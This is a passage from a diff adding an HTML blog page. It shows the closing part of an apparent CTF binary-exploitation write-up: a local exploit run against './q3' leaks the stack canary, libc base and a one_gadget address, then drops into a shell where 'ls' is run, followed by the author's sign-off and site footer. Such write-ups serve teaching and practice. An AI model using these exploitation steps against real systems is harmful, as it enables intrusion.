+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">9550</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nl">canary:</span> <span class="err">0</span><span class="nf">x648678ab45c48e00</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">libc</span> <span class="no">base</span><span class="p">:</span> <span class="mi">0x7ffff79e4000</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nl">one_gadget:</span> <span class="err">0</span><span class="nf">x7ffff7a332c5</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Switching</span> <span class="no">to</span> <span class="no">interactive</span> <span class="no">mode</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="no">ls</span>
+</span></span><span class="line"><span class="cl"><span class="nf">core</span>                 <span class="no">libc.so.6</span>       <span class="no">q3_exp.py</span>  <span class="no">q3.til</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="no">Interrupted</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">9550</span><span class="p">)</span>
+</span></span></code></pre></div><p>That was it folks, took more than I thought it would but we made it.</p>
+<p>I hope you enjoyed it and learned something today. If you encountered any problem or anything relevant contact me on <a href="https://twitter.com/d4mianwayne" target="_blank" rel="noreferrer">twitter</a></p>
+
+      </div>
+    </section>
+    <footer class="max-w-prose pt-8 print:hidden">
+      
+  <div class="flex">
+    
+    
+    
+    <div class="place-self-center">
+      
+      
+      <div class="text-2xl sm:text-lg">
+</div>
+    </div>
+  </div>
+
+
+      
+
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="group flex" href="/blog/v8-pwn-downunderctf/">
+              <span
+                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&larr;</span
+                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >DownunderCTF: V8 Pwn</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="0001-01-01 00:00:00 &#43;0000 UTC">1 January 0001</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="group flex text-right" href="/blog/smfonos/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Vulnhub - Symfonos</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2019-07-06 00:00:00 &#43;0000 UTC">6 July 2019</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[-2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&rarr;</span
+                ><span class="ltr:hidden rtl:inline">&larr;</span></span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        
+          <div class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12">
+            <a
+              href="#the-top"
+              class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+              aria-label="Scroll to top"
+              title="Scroll to top"
+            >
+              &uarr;
+            </a>
+          </div>
+        
+      </main><footer class="py-10 print:hidden">
+  
+  
+  <div class="flex items-center justify-between">
+    <div>
+      
+      
+        <p class="text-sm text-neutral-500 dark:text-neutral-400">
+            &copy;
+            2024
+            
+        </p>
+      
+      
+      
+        <p class="text-xs text-neutral-500 dark:text-neutral-400">
+          
+          
+          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
+        </p>
+      
+    </div>
+    <div class="flex flex-row items-center">
+      
+      
+      
+      
+    </div>
+  </div>
+  
+  
+</footer>
+
+    </div>
+  </body>
+</html>
